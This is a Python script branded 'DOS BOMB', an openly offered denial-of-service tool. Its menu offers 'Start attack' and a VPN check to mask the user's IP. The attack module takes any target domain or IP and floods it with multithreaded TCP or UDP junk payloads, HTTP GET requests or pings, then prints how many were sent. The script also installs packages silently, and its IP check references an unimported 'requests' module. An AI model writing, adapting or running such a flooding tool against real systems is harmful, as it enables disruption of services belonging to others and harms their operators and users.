
import subprocess
import sys

# --- AUTOMATIC DEPENDENCY INSTALLER ---
required_packages = ["requests", "tqdm"]

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"[!] Module '{package}' not found. Installing automatically...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        except Exception as e:
            print(f"[!] Failed to install {package}. Please install it manually using: pip install {package}")
            sys.exit(1)

# Standard and third-party imports
import os
import time
import socket
import platform
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from tqdm import tqdm

# Clear screen utility
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Smooth gradient from left to right: red and orange tones
def print_fire_gradient(lines, shift=0):
    colors = [
        '\033[38;5;214m', # Bright orange
        '\033[38;5;208m', # Orange
        '\033[38;5;202m', # Red-orange
        '\033[38;5;196m', # Pure red
        '\033[38;5;160m', # Dark red
        '\033[38;5;124m'  # Deep maroon
    ]
    reset = '\033[0m'
    
    for line in lines:
        colored_line = ""
        for i, char in enumerate(line):
            if char == " ":
                colored_line += " "
                continue
            color_index = (i + shift) % len(colors)
            colored_line += colors[color_index] + char
        print(colored_line + reset)

# Render animated DOS BOMB banner
def render_animated_banner():
    banner = [
        "m ██████╗  ██████╗ ███████╗ h    ██████╗  ██████╗ ███╗   ███╗██████╗ ",
        "a ██╔══██╗██╔═══██╗██╔════╝ a    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗",
        "d ██║  ██║██║   ██║███████╗ n    ██████╔╝██║   ██║██╔████╔██║██████╔╝",
        "e ██║  ██║██║   ██║╚════██║ e    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗",
        "b ██████╔╝╚██████╔╝███████║ r    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝",
        "y ╚═════╝  ╚═════╝ ╚══════╝ o    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ "
    ]
    clear_screen()
    for step in range(3):
        clear_screen()
        print_fire_gradient(banner, shift=step * 2)
        print()
        time.sleep(0.08)

# Animated menu frame
def print_animated_menu(shift=0):
    menu_lines = [
        "╔══════════════════════════════════════════╗",
        "║                                          ║",
        "║    > [1] Start attack                    ║",
        "║    > [2] Check IP (Your VPN Status)      ║",
        "║    > [3] Exit                            ║",
        "║                                          ║",
        "╚══════════════════════════════════════════╝"
    ]
    print_fire_gradient(menu_lines, shift=shift)

# IP / VPN Checker module
def action_check_ip():
    clear_screen()
    print("[*] --- MODULE: IP & VPN CHECKER --- [*]\n")
    print("[~] Fetching current public IP address...")
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        if response.status_code == 200:
            ip_data = response.json()
            print(f"\n[+] Your current Public IP: {ip_data.get('ip')}")
        else:
            print("\n[!] Could not fetch IP (server responded with error).")
    except Exception as e:
        print(f"\n[!] Connection error: {e}")
    
    input("\nPress Enter to return to the menu...")

# Attack module: supports 4 packet/protocol types
def action_start_attack():
    render_animated_banner()
    print("[*] --- MODULE: PACKET STRESS SENDER --- [*]\n")
    
    target = input("Enter target domain or IP (e.g., example.com): ").strip()
    if not target:
        print("[!] Target was not specified!")
        input("\nPress Enter to return to the menu...")
        return

    print("\nSelect Protocol / Method:")
    print("1. TCP (Port-based, e.g., 80/443)")
    print("2. UDP (Datagram payload)")
    print("3. HTTP GET Request")
    print("4. ICMP Ping (Standard system ping)")
    
    choice = input("Enter choice (1-4, default 1): ").strip()
    if not choice:
        choice = "1"

    try:
        count_input = input("Enter total number of requests/packets (e.g., 50): ").strip()
        count = int(count_input) if count_input else 10
    except ValueError:
        count = 10

    try:
        threads_input = input("Enter max concurrent threads / concurrency (default 10): ").strip()
        max_workers = int(threads_input) if threads_input else 10
    except ValueError:
        max_workers = 10

    print(f"\n[~] Resolving address for {target}...")
    try:
        ip_addr = socket.gethostbyname(target)
        print(f"[+] Target resolved to IP: {ip_addr}")
    except socket.gaierror:
        print(f"[!] Error: Could not resolve target domain '{target}'.")
        input("\nPress Enter to return to the menu...")
        return

    success_count = 0
    fail_count = 0
    stats_lock = threading.Lock()

    def add_result(is_success):
        nonlocal success_count, fail_count
        with stats_lock:
            if is_success:
                success_count += 1
            else:
                fail_count += 1

    time.sleep(0.5)

    # Worker functions
    def tcp_worker(ip, port, size):
        payload = b"X" * size
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((ip, port))
            sock.sendall(payload)
            sock.close()
            add_result(True)
        except Exception:
            add_result(False)

    def udp_worker(ip, port, size):
        payload = b"X" * size
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (ip, port))
            sock.close()
            add_result(True)
        except Exception:
            add_result(False)

    def http_worker(url):
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=3) as response:
                if response.status < 400:
                    add_result(True)
                    return
        except Exception:
            pass
        add_result(False)

    def ping_worker(host):
        param = "-n" if platform.system().lower() == "windows" else "-c"
        try:
            command = ["ping", param, "1", host]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                add_result(True)
                return
        except Exception:
            pass
        add_result(False)

    port, size, url = 80, 64, ""
    if choice == "1":
        port_input = input("Enter target TCP port (default 80): ").strip()
        port = int(port_input) if port_input.isdigit() else 80
        size_input = input("Enter payload size in bytes (default 64): ").strip()
        size = int(size_input) if size_input else 64
    elif choice == "2":
        port_input = input("Enter target UDP port (default 80 or 53): ").strip()
        port = int(port_input) if port_input.isdigit() else 80
        size_input = input("Enter payload size in bytes (default 64): ").strip()
        size = int(size_input) if size_input else 64
    elif choice == "3":
        url = target if target.startswith("http") else f"http://{target}"
    elif choice != "4":
        print("[!] Invalid choice.")
        input("\nPress Enter to return to the menu...")
        return

    print(f"\n[~] Execution started with {max_workers} threads...\n")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for _ in range(count):
            if choice == "1":
                futures.append(executor.submit(tcp_worker, ip_addr, port, size))
            elif choice == "2":
                futures.append(executor.submit(udp_worker, ip_addr, port, size))
            elif choice == "3":
                futures.append(executor.submit(http_worker, url))
            elif choice == "4":
                futures.append(executor.submit(ping_worker, target))

        with tqdm(total=count, desc="Progress", unit="req") as pbar:
            for future in as_completed(futures):
                pbar.update(1)

    elapsed = time.time() - start_time
    
    print("\n" + "="*40)
    print("            TRANSMISSION STATS            ")
    print("="*40)
    print(f"[*] Total planned:      {count}")
    print(f"[+] Successfully sent:  {success_count}")
    print(f"[!] Failed / Errors:    {fail_count}")
    print(f"[*] Time elapsed:       {elapsed:.2f} sec.")
    print("="*40)
    
    input("\nPress Enter to return to the menu...")

def main():
    while True:
        render_animated_banner()
        print_animated_menu()
        
        choice = input("\nSelect option (1-3): ").strip()
        if choice == "1":
            action_start_attack()
        elif choice == "2":
            action_check_ip()
        elif choice == "3":
            clear_screen()
            print("[*] Exiting... Goodbye!")
            sys.exit(0)
        else:
            print("[!] Invalid option, please choose 1, 2 or 3.")
            time.sleep(1)

if __name__ == "__main__":
    main()